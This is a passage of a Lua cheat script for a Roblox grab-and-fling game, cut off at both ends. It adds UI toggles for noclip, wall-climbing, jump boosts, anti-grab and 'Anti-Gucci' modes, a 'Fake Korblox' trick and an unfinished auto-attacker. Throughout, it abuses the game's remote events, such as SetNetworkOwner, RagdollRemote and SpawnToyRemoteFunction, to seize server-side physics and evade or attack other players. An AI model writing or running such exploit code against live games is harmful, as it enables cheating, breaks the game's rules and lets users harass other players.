            end)
        else
            if Config.jumpConnection then
                Config.jumpConnection:Disconnect()
                Config.jumpConnection = nil
            end
        end
    end
})

MainLocal:AddSlider("Jumppower", {
    Text = "Jump Power",
    Min = 24,
    Max = 300,
    Default = Config.jumpPower,
    Rounding = 1,
    Callback = function(Value)
        Config.jumpPower = Value
        local char = localPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            local hum = char.Humanoid
            hum.UseJumpPower = true
            hum.JumpPower = Value
        end
    end
})

ExtraLocal:AddToggle("Spider", {
    Text = "Spider",
    Default = false,
    Callback = function(Value)
        Config.spiderT = Value
        if Config.spiderCon then
            Config.spiderCon:Disconnect()
            Config.spiderCon = nil
        end
        if Value then
            Config.spiderCon = service.RunService.Heartbeat:Connect(function()
                local char = GetCharacter()
                local hrpPart = HRP()
                local hum = getLocalHum()
                if not char or not hrpPart or not hum then return end
                local raycastParams = RaycastParams.new()
                raycastParams.FilterDescendantsInstances = {char}
                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                local rayDirection = hrpPart.CFrame.LookVector * 1.5
                local raycastResult = service.Workspace:Raycast(hrpPart.Position, rayDirection, raycastParams)
                if raycastResult and hum.MoveDirection.Magnitude > 0 then
                    hrpPart.AssemblyLinearVelocity = Vector3.new(hrpPart.AssemblyLinearVelocity.X, Config.climbSpeed, hrpPart.AssemblyLinearVelocity.Z)
                end
            end)
        end
    end    
})

ExtraLocal:AddSlider("ClimbSpeed", {
    Text = "Climb Speed",
    Min = 20,
    Max = 50,
    Default = 20,
    Rounding = 1,
    Callback = function(Value)
        Config.climbSpeed = Value
    end    
})

ExtraLocal:AddToggle("Nocli", {
    Text = "Noclip",
    Default = false,
    Callback = function(Value)
        Config.noclip = Value
        if Config.NoclipConnection then
            Config.NoclipConnection:Disconnect()
            Config.NoclipConnection = nil
        end
        if Config.noclip then
            Config.NoclipConnection = service.RunService.Stepped:Connect(function()

                local character = GetCharacter()
                if character then
                    for _, part in ipairs(character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        end
    end    
})

ExtraLocal:AddToggle("SpinC", {
	Text = "Spin Character",
	Default = false,
	Callback = function(Value)
		if Value then
			Config.spincconnn = service.RunService.Heartbeat:Connect(function()
				local character = localPlayer.Character
				local root = character and character:FindFirstChild("HumanoidRootPart")
				if root then
					root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(Config.spinsp), 0)
				end
			end)
		else
			if Config.spincconnn then
				Config.spincconnn:Disconnect()
				Config.spincconnn = nil
			end
		end
	end
})

ExtraLocal:AddSlider("SpinS", {
	Text = "Spin Speed",
	Default = 5,
	Min = 1,
	Max = 50,
	Rounding = 1,
	Callback = function(Value)
		Config.spinsp = Value
	end
})

ExtraLocal:AddSlider("FPScap", {
    Text = "FPS",
    Min = 5,
    Max = 10000,
    Default = 300,
    Rounding = 1,
    Callback = function(fpsCap1)
        setfpscap(fpsCap1)
    end
})

Korblox:AddButton({
	Text = "Fake Korblox",
	Callback = function()
        task.spawn(function()
            local char = GetCharacter()
            local rightLeg = char:FindFirstChild("Right Leg")
            local torso = char:WaitForChild("Torso")
            local hrp = char:WaitForChild("HumanoidRootPart")
            if rightLeg and torso and hrp then
                local originalFallHeight = service.Workspace.FallenPartsDestroyHeight
                local originalCFrame = torso.CFrame
                service.Workspace.FallenPartsDestroyHeight = -100
                RagdollRemote:FireServer(hrp, 2)
                task.wait(0.5)
                rightLeg.CFrame = CFrame.new(0, -10000, 0)
                task.wait(0.3)
                torso.CFrame = CFrame.new(0, -9970, 0)
                task.wait(0.5)
                torso.CFrame = originalCFrame
                task.wait(0.5)
                service.Workspace.FallenPartsDestroyHeight = originalFallHeight
            end
        	task.wait(0.2)
	        local hrp2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    	    if not hrp2 then return end
        	local spawnCFrame = hrp2.CFrame * CFrame.new(0, 0, -5)
        	spawntoy("NinjaKunai", spawnCFrame, Vector3.zero)
	        task.wait(0.5)
	        local inv = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
	        local kunai = inv and inv:FindFirstChild("NinjaKunai")
	        if not kunai or not kunai:FindFirstChild("StickyPart") then return end
	        local kunaiPos = kunai.StickyPart.Position
	        hrp2.CFrame = CFrame.new(kunaiPos + Vector3.new(0, 0, 2))
	        task.wait(0.1)
	        pcall(function() SetNetworkOwner:FireServer(kunai.StickyPart, kunai.StickyPart.CFrame) end)
	        pcall(function() CreateGrabLine:FireServer(kunai.StickyPart, Vector3.zero, kunai.StickyPart.Position, false) end)
	        task.wait(0.05)
	        pcall(function() DestroyGrabLine:FireServer(kunai.StickyPart) end)
	        for _, obj in pairs(kunai:GetChildren()) do
            	if obj:IsA("BasePart") then
                	obj.CanTouch = false
                	obj.CanQuery = false
            	end
        	end
	        local firePart = hrp2:FindFirstChild("FirePlayerPart") or hrp2:WaitForChild("FirePlayerPart", 5)
    	    if not firePart then
        	    local torso = char:FindFirstChild("Torso")
            	firePart = torso and torso:FindFirstChild("FirePlayerPart")
    	    end
        	if not firePart then firePart = hrp2 end
	        if firePart then
    	        local korbloxOffset = CFrame.new(0.5, -1.3, 0) * CFrame.Angles(0, 0, math.rad(90))
        	    for i = 1, 10 do
            	    task.spawn(function()
                	    pcall(function() StickyPartEvent:FireServer(kunai.StickyPart, firePart, korbloxOffset) end)
                	end)
            	end
        	end
        	Config.kunaiMonitorConn = task.spawn(function()
            	local korbloxOffset = CFrame.new(0.5, -1.3, 0) * CFrame.Angles(0, 0, math.rad(90))
	            local kunaiFrame = 0
    	        while kunai and kunai.Parent and kunai:FindFirstChild("StickyPart") do
        	        task.wait(0.5)
            	    local curChar = localPlayer.Character
                	local curHRP = curChar and curChar:FindFirstChild("HumanoidRootPart")
                	if not curHRP then continue end
	                local sticky = kunai:FindFirstChild("StickyPart")
    	            if not sticky then break end
        	        local dist = (sticky.Position - curHRP.Position).Magnitude
            	    if dist < 2 then continue end
                	local savedCF = curHRP.CFrame
	                curHRP.CFrame = sticky.CFrame * CFrame.new(0, 0, 4)
    	            task.wait(0.2)
        	        if kunaiFrame % 3 == 0 then
            	        pcall(function() SetNetworkOwner:FireServer(sticky, sticky.CFrame) end)
                	elseif kunaiFrame % 3 == 1 then
                    	pcall(function() CreateGrabLine:FireServer(sticky, Vector3.zero, sticky.Position, false) end)
                	else
                    	pcall(function() DestroyGrabLine:FireServer(sticky) end)
	                end
    	            task.wait(0.05)
        	        local fp = curHRP:FindFirstChild("FirePlayerPart") or curHRP:WaitForChild("FirePlayerPart", 5)
            	    if not fp then
                	    local torso = curChar:FindFirstChild("Torso")
                    	fp = torso:FindFirstChild("FirePlayerPart")
                	end
	                if not fp then fp = curHRP end
	                if fp then
    	                pcall(function() StickyPartEvent:FireServer(sticky, fp, korbloxOffset) end)
        	        end
            	    task.wait(0.1)
                	curHRP.CFrame = savedCF
	                kunaiFrame = kunaiFrame + 1
    	        end
        	end)
    	end)
	end
})

LeftGroupBox:AddToggle("Antigrab", {
    Text = "Anti-Grab",
    Default = false,
    Callback = function(Value)
        if Value then
            if not Config.AntigrabCon then
                Config.AntigrabCon = service.RunService.RenderStepped:Connect(function()
                    local Char = GetCharacter()
                    local hrp = Char and Char:FindFirstChild("HumanoidRootPart")
                    local humanoid = Char and Char:FindFirstChild("Humanoid")
                    if hrp and humanoid then
                        if hrp.ReceiveAge ~= 0 then
                            hrp.Anchored = true
                            if isHeld then
                                isHeld.Value = false
                            end
                            task.spawn(function()
                                Struggle:FireServer()
                                RagdollRemote:FireServer(hrp, 0)
                            end)
                            service.ContextActionService:UnbindAction("JumpRemover")
                            humanoid.AutoRotate = true
                            if hrp:FindFirstChild("RootJoint") then
                                hrp.RootJoint.Enabled = true
                            end
                            hrp.Anchored = false
                        elseif hrp.ReceiveAge == 0 then
                            hrp.Anchored = false
                        end
                    end
                end)
            end
        else
            if Config.AntigrabCon then
                Config.AntigrabCon:Disconnect()
                Config.AntigrabCon = nil
            end
        end
    end
})

LeftGroupBox:AddToggle("Antiragrag", {
    Text = "Anti-Grab (Ragdoll)",
    Default = false,
    Callback = function(Value)
        Config.AntiGrabRag = Value
        for k, v in pairs(Config.Contuuti) do
            if v then v:Disconnect() end
        end
        table.clear(Config.Contuuti)
        if Config.AntiGrabRag then
            local function setupAntiGrab(char)
                if not char or not Config.AntiGrabRag then return end
                local hrp = char:WaitForChild("HumanoidRootPart", 5)
                local hum = char:WaitForChild("Humanoid", 5)
                local head = char:WaitForChild("Head", 5)
                if not (hrp and hum and head) then return end
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") and v:FindFirstChild("BallSocketConstraint") and v.Name ~= "Head" then
                        v.BallSocketConstraint.Enabled = false
                        if v:FindFirstChild("RagdollLimbPart") then
                            v.RagdollLimbPart.WeldConstraint.Enabled = false
                        end
                    end
                end
                Config.Contuuti["AGHead"] = head.ChildAdded:Connect(function(PartOwner)
                    if PartOwner.Name == "PartOwner" then
                        if not Config.AntigrabRGProc then
                            Config.AntigrabRGProc = true
                            hum.Sit = false
                            Struggle:FireServer(localPlayer)
                            
                            task.spawn(function() 
                                while (head and head:FindFirstChild("PartOwner")) or isHeld.Value do
                                    Struggle:FireServer(localPlayer)
                                    RagdollRemote:FireServer(hrp, 0)
                                    task.wait()
                                end
                            end)
                            hrp.Anchored = true
                            if not Config.AntigrabragWalk then
                                Config.AntigrabragWalk = true
                                while isHeld.Value and task.wait() do
                                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
                                end
                            end
                            hrp.Anchored = false
                            Config.AntigrabRGProc = false
                            Config.AntigrabragWalk = false
                        end
                    end
                end)
                local ragdolled = hum:WaitForChild("Ragdolled", 5)
                if ragdolled then
                    Config.Contuuti["AGRagdoll"] = ragdolled.Changed:Connect(function()
                        if hum.Ragdolled.Value then
                            for _, v in pairs(char:GetChildren()) do
                                if v:IsA("BasePart") and v:FindFirstChild("BallSocketConstraint") and v.Name ~= "Head" then
                                    v.BallSocketConstraint.Enabled = false
                                    if v:FindFirstChild("RagdollLimbPart") then
                                        v.RagdollLimbPart.WeldConstraint.Enabled = false
                                    end
                                end
                            end
                        end
                    end)
                end
                local weldHRP = hrp:WaitForChild("WeldHRP", 5)
                if weldHRP then
                    Config.Contuuti["AGWeld"] = weldHRP.Changed:Connect(function()
                        if hrp.WeldHRP.Enabled then
                            while not hum.Sit do task.wait() end
                            hum.Sit = false
                            hum.AutoRotate = true
                            hum.HipHeight = 1
                            while hrp.WeldHRP.Enabled and task.wait() do
                                head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0)
                            end
                            hum.HipHeight = 0
                        end
                    end)
                end
            end
            setupAntiGrab(localPlayer.Character)
            Config.Contuuti["AGChar"] = localPlayer.CharacterAdded:Connect(setupAntiGrab)
        else
            local char = localPlayer.Character
            if char then
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") and v:FindFirstChild("BallSocketConstraint") and v.Name ~= "Head" then
                        v.BallSocketConstraint.Enabled = false
                        if v:FindFirstChild("RagdollLimbPart") then
                            v.RagdollLimbPart.WeldConstraint.Enabled = true
                        end
                    end
                end
            end
        end
    end
})

LeftGroupBox:AddToggle("Antigucci", {
    Text = "Anti-Gucci (Blobman)",
    Default = false,
    Callback = function(Value)
        Config.gucciRunId = Config.gucciRunId + 1
        if Value then
            local MyId = Config.gucciRunId
            local isSetupFinished = false
            local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local hum = FWD(char, "Humanoid")
            local hrp = FWD(char, "HumanoidRootPart")
            if not (hum and hrp) then
                return
            end
            pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
            task.spawn(function()
                local t = tick()
                while tick() - t < 0.8 and MyId == Config.gucciRunId do
                    if hrp and hrp.Parent then
                        hrp.Velocity = Vector3.zero
                        hrp.RotVelocity = Vector3.zero
                    end
                    service.RunService.Heartbeat:Wait()
                end
            end)
            local Blob = spawntoy("CreatureBlobman", hrp.CFrame * CFrame.new(0, 0, -5), Vector3.new(0, -15.716, 0))
            if not Blob then
                return
            end
            local BHead = FWD(Blob, "Head")
            local HitBox = FWD(Blob, "GrabbableHitbox")
            local Seat = FWD(Blob, "VehicleSeat")
            task.spawn(function()
                local startTime = tick()
                while MyId == Config.gucciRunId and not isSetupFinished and tick() - startTime < 1.2 do
                    if HitBox and HitBox:IsA("BasePart") and SetNetworkOwner then
                        pcall(function() SetNetworkOwner:FireServer(HitBox, HitBox.CFrame) end)
                    end
                    if BHead and BHead:IsA("BasePart") and SetNetworkOwner then
                        pcall(function() SetNetworkOwner:FireServer(BHead, BHead.CFrame) end)
                    end
                    if Seat and Seat.Parent and Seat.Occupant ~= hum then
                        pcall(function() Seat:Sit(hum) end)
                    end
                    if RagdollRemote then
                        pcall(function() RagdollRemote:FireServer(hrp, 0.09) end)
                    end
                    service.RunService.Heartbeat:Wait()
                end
            end)
            task.wait(0.45)
            if MyId ~= Config.gucciRunId then
                if Blob and Blob.Parent then Blob:Destroy() end
                return
            end
            isSetupFinished = true
            pcall(function() hum.Sit = false end)
            if Seat and Seat.Parent then
                Seat.Disabled = true
                Seat.CanTouch = false
                Seat.CanQuery = false
                for _, v in pairs(Seat:GetChildren()) do
                    if v:IsA("Weld") or v.Name == "SeatWeld" then 
                        v:Destroy() 
                    end
                end
            end
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
            task.wait(0.05)
            if RagdollRemote then
                pcall(function() RagdollRemote:FireServer(hrp, false) end)
            end
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            Blob.Name = "Gucci"
            for _, v in pairs(Blob:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                    v.CanTouch = false
                    v.CanQuery = false
                    v.Massless = true
                end
            end
            task.spawn(function()
                while MyId == Config.gucciRunId and BHead and BHead.Parent do
                    if BHead and BHead.Parent then
                        BHead.CFrame = CFrame.new(BHead.Position.X, 100000, BHead.Position.Z)
                    end
                    service.RunService.Heartbeat:Wait()
                end
            end)
            
            Config.gucciActive = true
        else
            Config.gucciActive = false
            local char = localPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum then
                pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true) end)
            end
            local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if toyFolder then
                for _, v in pairs(toyFolder:GetChildren()) do
                    if v.Name == "Gucci" or v.Name == "CreatureBlobman" then
                        pcall(function() v:Destroy() end)
                    end
                end
            end
            if hum then
                hum.Health = 0
            end
        end
    end
})

LeftGroupBox:AddToggle("RagdollGucci", {
    Text = "Anti-Gucci (Ragdoll)",
    Default = false,
    Callback = function(Value)
        if Value then
            if Config.active then
                Config.runId = Config.runId + 1
                Config.active = false
                Config.seatOccupied = false
                Config.monitoring = false
                Config.blobRef = nil
                Config.ragdollLoopActive = false
                if Config.ragdollTask then
                    task.cancel(Config.ragdollTask)
                    Config.ragdollTask = nil
                end
                Config.permRagActive = false
                if Config.permRagTask then
                    task.cancel(Config.permRagTask)
                    Config.permRagTask = nil
                end
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                if root then
                    local remote = Config.remoteRef
                    if not remote then
                        local charEv = service.ReplicatedStorage:FindFirstChild("CharacterEvents")
                        remote = (charEv and charEv:FindFirstChild("RagdollRemote")) 
                                or service.ReplicatedStorage:FindFirstChild("RagdollRemote") 
                                or game:FindFirstChild("RagdollRemote", true)
                        if remote then Config.remoteRef = remote end
                    end
                    if remote and remote:IsA("RemoteEvent") then
                        pcall(function() remote:FireServer(root, 0) end)
                    end
                end
                local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. 'SpawnedInToys')
                if toyFolder then
                    for _, child in pairs(toyFolder:GetChildren()) do
                        if child.Name == "Gucci" or child.Name == "CreatureBlobman" then
                            pcall(function() child:Destroy() end)
                        end
                    end
                end
                
                task.wait(0.3)
            end
            Config.runId = Config.runId + 1
            local currentRunId = Config.runId
            Config.setupDone = false
            Config.seatOccupied = false
            Config.monitoring = false
            local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local humanoid = character:FindFirstChild("Humanoid") or character:WaitForChild("Humanoid", 3)
            local rootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 3)
            if not (humanoid and rootPart) then return end
            pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
            task.spawn(function()
                local startTime = tick()
                while tick() - startTime < 0.8 and currentRunId == Config.runId do
                    if rootPart and rootPart.Parent then
                        pcall(function()
                            rootPart.Velocity = Vector3.zero
                            rootPart.RotVelocity = Vector3.zero
                        end)
                    end
                    service.RunService.Heartbeat:Wait()
                end
            end)
            local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. 'SpawnedInToys')
            local blob = nil
            if toyFolder then
                local connection
                connection = toyFolder.ChildAdded:Connect(function(child)
                    if child.Name == "CreatureBlobman" then
                        blob = child
                        connection:Disconnect()
                    end
                end)
                task.spawn(function()
                    local menuToys = service.ReplicatedStorage:FindFirstChild("MenuToys")
                    if menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction") then
                        pcall(function()
                            menuToys.SpawnToyRemoteFunction:InvokeServer(
                                "CreatureBlobman", 
                                rootPart.CFrame * CFrame.new(0, 0, -5), 
                                Vector3.new(0, -15.716, 0)
                            )
                        end)
                    end
                end)
                local spawnStart = tick()
                while not blob and tick() - spawnStart < 4 do
                    service.RunService.Heartbeat:Wait()
                end
                if connection then connection:Disconnect() end
            end
            if not blob then return end
            local head = blob:FindFirstChild("Head") or blob:WaitForChild("Head", 3)
            local hitbox = blob:FindFirstChild("GrabbableHitbox") or blob:WaitForChild("GrabbableHitbox", 3)
            local seat = blob:FindFirstChild("VehicleSeat") or blob:WaitForChild("VehicleSeat", 3)
            if seat and not Config.monitoring then
                Config.monitoring = true
                Config.blobRef = blob
                task.spawn(function()
                    while Config.active and seat and seat.Parent and blob and blob.Parent do
                        local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
                        if hum and seat.Occupant == hum then
                            if not Config.seatOccupied then
                                Config.seatOccupied = true
                                if not Config.ragdollLoopActive then
                                    Config.ragdollLoopActive = true
                                    if Config.ragdollTask then task.cancel(Config.ragdollTask) end
                                    Config.ragdollTask = task.spawn(function()
                                        while Config.ragdollLoopActive do
                                            local char = localPlayer.Character
                                            if char then
                                                local h = char:FindFirstChild("Humanoid")
                                                local r = char:FindFirstChild("HumanoidRootPart")
                                                if h and r and h.Health > 0 then
                                                    pcall(function()
                                                        h.Sit = true
                                                        h:ChangeState(Enum.HumanoidStateType.Running)
                                                    end)
                                                    local cam = service.Workspace.CurrentCamera
                                                    if cam then
                                                        local look = cam.CFrame.LookVector
                                                        pcall(function()
                                                            r.CFrame = CFrame.new(r.Position, r.Position + Vector3.new(look.X, 0, look.Z))
                                                        end)
                                                    end
                                                end
                                            end
                                            task.wait()
                                        end
                                    end)
                                end
                                if not Config.permRagActive then
                                    Config.permRagActive = true
                                    if Config.permRagTask then task.cancel(Config.permRagTask) end
                                    Config.permRagTask = task.spawn(function()
                                        while Config.permRagActive do
                                            local char = localPlayer.Character
                                            local r = char and char:FindFirstChild("HumanoidRootPart")
                                            if r then
                                                local remote = Config.remoteRef
                                                if not remote then
                                                    local charEv = service.ReplicatedStorage:FindFirstChild("CharacterEvents")
                                                    remote = (charEv and charEv:FindFirstChild("RagdollRemote")) 
                                                            or service.ReplicatedStorage:FindFirstChild("RagdollRemote") 
                                                            or game:FindFirstChild("RagdollRemote", true)
                                                    if remote then Config.remoteRef = remote end
                                                end
                                                if remote and remote:IsA("RemoteEvent") then
                                                    pcall(function() remote:FireServer(r, 1) end)
                                                end
                                            end
                                            task.wait(0.7)
                                        end
                                    end)
                                end
                                pcall(function()
                                    seat.Disabled = true
                                    seat.CanTouch = false
                                    seat.CanQuery = false
                                    for _, child in pairs(seat:GetChildren()) do
                                        if child:IsA("Weld") or child.Name == "SeatWeld" then
                                            child:Destroy()
                                        end
                                    end
                                end)
                                if blob then
                                    for _, desc in pairs(blob:GetDescendants()) do
                                        if desc:IsA("BasePart") then
                                            pcall(function()
                                                desc.CanCollide = false
                                                desc.CanTouch = false
                                                desc.CanQuery = false
                                                desc.Massless = true
                                            end)
                                        end
                                    end
                                end
                            end
                        else
                            if Config.seatOccupied then
                                Config.seatOccupied = false
                            end
                        end
                        task.wait(0.1)
                    end
                    Config.monitoring = false
                    Config.seatOccupied = false
                    Config.blobRef = nil
                end)
            end
            task.spawn(function()
                local grabEvents = service.ReplicatedStorage:FindFirstChild("GrabEvents")
                local setNetOwner = function(part)
                    if part and part:IsA("BasePart") and grabEvents and grabEvents:FindFirstChild("SetNetworkOwner") then
                        pcall(function() grabEvents.SetNetworkOwner:FireServer(part, part.CFrame) end)
                    end
                end
                local startTime = tick()
                while currentRunId == Config.runId and not Config.setupDone and tick() - startTime < 1.2 do
                    if hitbox and hitbox.Parent then setNetOwner(hitbox) end
                    if head and head.Parent then setNetOwner(head) end
                    if seat and seat.Parent and seat.Occupant ~= humanoid then
                        pcall(function() seat:Sit(humanoid) end)
                    end
                    local characterEvents = service.ReplicatedStorage:FindFirstChild("CharacterEvents")
                    if characterEvents and characterEvents:FindFirstChild("RagdollRemote") then
                        pcall(function() characterEvents.RagdollRemote:FireServer(rootPart, 0.09) end)
                    end
                    service.RunService.Heartbeat:Wait()
                end
            end)
            task.wait(0.45)
            if currentRunId ~= Config.runId then
                if blob and blob.Parent then blob:Destroy() end
                return
            end
            Config.setupDone = true
            pcall(function() humanoid.Sit = false end)
            pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)
            task.wait(0.05)
            local characterEvents = service.ReplicatedStorage:FindFirstChild("CharacterEvents")
            if characterEvents and characterEvents:FindFirstChild("RagdollRemote") then
                pcall(function() characterEvents.RagdollRemote:FireServer(rootPart, false) end)
            end
            pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            blob.Name = "Gucci"
            for _, desc in pairs(blob:GetDescendants()) do
                if desc:IsA("BasePart") then
                    pcall(function()
                        desc.CanCollide = false
                        desc.CanTouch = false
                        desc.CanQuery = false
                        desc.Massless = true
                    end)
                end
            end
            task.spawn(function()
                while currentRunId == Config.runId and head and head.Parent do
                    pcall(function()
                        head.CFrame = CFrame.new(head.Position.X, 100000, head.Position.Z)
                    end)
                    service.RunService.Heartbeat:Wait()
                end
            end)
            Config.active = true
        else
            Config.runId = Config.runId + 1
            Config.active = false
            Config.seatOccupied = false
            Config.monitoring = false
            Config.blobRef = nil
            Config.ragdollLoopActive = false
            if Config.ragdollTask then
                task.cancel(Config.ragdollTask)
                Config.ragdollTask = nil
            end
            Config.permRagActive = false
            if Config.permRagTask then
                task.cancel(Config.permRagTask)
                Config.permRagTask = nil
            end
            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local remote = Config.remoteRef
                if not remote then
                    local charEv = service.ReplicatedStorage:FindFirstChild("CharacterEvents")
                    remote = (charEv and charEv:FindFirstChild("RagdollRemote")) 
                            or service.ReplicatedStorage:FindFirstChild("RagdollRemote") 
                            or game:FindFirstChild("RagdollRemote", true)
                    if remote then Config.remoteRef = remote end
                end
                if remote and remote:IsA("RemoteEvent") then
                    pcall(function() remote:FireServer(root, 0) end)
                end
            end
            local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. 'SpawnedInToys')
            if toyFolder then
                for _, child in pairs(toyFolder:GetChildren()) do
                    if child.Name == "Gucci" or child.Name == "CreatureBlobman" then
                        pcall(function() child:Destroy() end)
                    end
                end
            end
        end
    end
})

LeftGroupBox:AddToggle("GucciT", {
    Text = "Anti-Gucci (Tractor)",
    Default = false,
    Callback = function(Value)
        if not Value then
            Config.tractorGucciT = false
            Config.tractorGucci3 = false
            if Config.tractorGucci4 then
                Config.tractorGucci4:Cancel()
                Config.tractorGucci4 = nil
            end
            if Config.tractorGucci5 then
                for _, conn in pairs(Config.tractorGucci5) do
                    if type(conn) == "thread" then
                        task.cancel(conn)
                    else
                        pcall(function() conn:Disconnect() end)
                    end
                end
            end
            Config.tractorGucci5 = {}
            local f = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if f then
                local v = f:FindFirstChild("TractorGreen")
                if v and DestroyToy then
                    pcall(function()
                        DestroyToy:FireServer(v)
                    end)
                end
            end
            return
        end
        Config.tractorGucciT = true
        Config.tractorGucci3 = false
        Config.tractorGucci5 = Config.tractorGucci5 or {}
        local c = localPlayer.Character
        if c and c:FindFirstChild("HumanoidRootPart") then
            Config.tractorGucci2 = c.HumanoidRootPart.CFrame
            local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            local vehicle = toyFolder and toyFolder:FindFirstChild("TractorGreen")
            if not vehicle and SpawnToyRemoteFunction then
                local ok = pcall(function()
                    return SpawnToyRemoteFunction:InvokeServer(
                        "TractorGreen",
                        CFrame.new(0, 1000000, 0),
                        Vector3.zero
                    )
                end)
                if ok then
                    toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    vehicle = toyFolder and toyFolder:FindFirstChild("TractorGreen")
                    if vehicle then
                        task.spawn(function()
                            for _, p in pairs(vehicle:GetDescendants()) do
                                if p:IsA("BasePart") then
                                    p.Anchored = true
                                    p.CFrame = CFrame.new(0, 1000000, 0)
                                end
                            end
                        end)
                    end
                end
            end
        end
        local conn1 = localPlayer.CharacterAdded:Connect(function()
            task.wait(0.1)
            Config.tractorGucci3 = false
            if Config.tractorGucci4 then
                Config.tractorGucci4:Cancel()
                Config.tractorGucci4 = nil
            end
            if Config.tractorGucciT then
                local char = localPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    Config.tractorGucci2 = char.HumanoidRootPart.CFrame
                end
                
                local tf = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                if not (tf and tf:FindFirstChild("TractorGreen")) and SpawnToyRemoteFunction then
                    pcall(function()
                        SpawnToyRemoteFunction:InvokeServer("TractorGreen", CFrame.new(0, 1000000, 0), Vector3.zero)
                    end)
                end
            end
        end)
        table.insert(Config.tractorGucci5, conn1)
        local conn2 = task.spawn(function()
            while true do
                local hum = getLocalHum()
                local cond = (not Config.tractorGucci3 or (Config.tractorGucci4 and Config.tractorGucci3))
                if Config.tractorGucciT and cond then
                    local tf = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local v = tf and tf:FindFirstChild("TractorGreen")
                    if v then
                        local seat = v:FindFirstChild("VehicleSeat") or v:FindFirstChildOfClass("VehicleSeat")
                        if not seat then
                            for _, desc in pairs(v:GetDescendants()) do
                                if desc:IsA("VehicleSeat") then
                                    seat = desc
                                    break
                                end
                            end
                        end
                        if seat and hum and not hum.Sit then
                            local hrpPart = HRP()
                            if hrpPart then
                                Config.tractorGucci2 = hrpPart.CFrame
                                hrpPart.CFrame = seat.CFrame + Vector3.new(0, 0.5, 0)
                                local ok = pcall(function() seat:Sit(hum) end)
                                if ok then
                                    task.wait(0.1)
                                    if hum then
                                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                                        if Config.tractorGucci2 and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                            localPlayer.Character.HumanoidRootPart.CFrame = Config.tractorGucci2
                                        end
                                    end
                                else
                                    if Config.tractorGucci2 and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                        localPlayer.Character.HumanoidRootPart.CFrame = Config.tractorGucci2
                                    end
                                end
                            end
                            if not Config.tractorGucci3 then
                                Config.tractorGucci3 = true
                                if Config.tractorGucci4 then Config.tractorGucci4:Cancel() end
                                Config.tractorGucci4 = task.delay(0.1, function()
                                    Config.tractorGucci3 = false
                                    Config.tractorGucci4 = nil
                                end)
                            end
                        end
                    else
                        if SpawnToyRemoteFunction then
                            pcall(function()
                                SpawnToyRemoteFunction:InvokeServer("TractorGreen", CFrame.new(0, 1000000, 0), Vector3.zero)
                            end)
                        end
                    end
                end
                if Config.tractorGucciT and hum then
                    local hrpPart = HRP()
                    if hrpPart and RagdollRemote then
                        pcall(function() RagdollRemote:FireServer(hrpPart, 0) end)
                    end
                end
                
                task.wait(0.016)
            end
        end)
        table.insert(Config.tractorGucci5, conn2)
        local conn3 = service.RunService.Heartbeat:Connect(function()
            if Config.tractorGucciT then
                local hum = getLocalHum()
                local hrpPart = HRP()
                if hum and hrpPart and RagdollRemote then
                    pcall(function() RagdollRemote:FireServer(hrpPart, 0) end)
                end
            end
        end)
        table.insert(Config.tractorGucci5, conn3)
    end 
})

LeftGroupBox:AddToggle("antigrabtp", {
	Text = "Anti-Grab (TP)",
	Default = false,
	Callback = function(Value)
		Config.AntigrabTPT = Value
		local char = GetCharacter()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if Value then
			if hum then
				hum.PlatformStand = true
			end
			task.spawn(function()
				while Config.AntigrabTPT and hrp do
					local x = math.random(-500, 500)
					local y = math.random(30, 480)
					local z = math.random(-500, 500)
					hrp.CFrame = CFrame.new(x, y, z)
					task.wait(0.03)
				end
			end)
		else
			if hum then
				hum.PlatformStand = false
			end
		end
	end,
})

LeftGroupBox:AddToggle("Autoat", {
    Text = "Auto Attacker",
    Default = false,
    Callback = function(enabled)
        Config.autoatakka = enabled
        if enabled then
            Config.AutoAttackerToggle = coroutine.create(function()
                while Config.autoatakka do
                    task.wait(0.02)
                    local character = GetCharacter()
                    local head = character and character:FindFirstChild("Head")
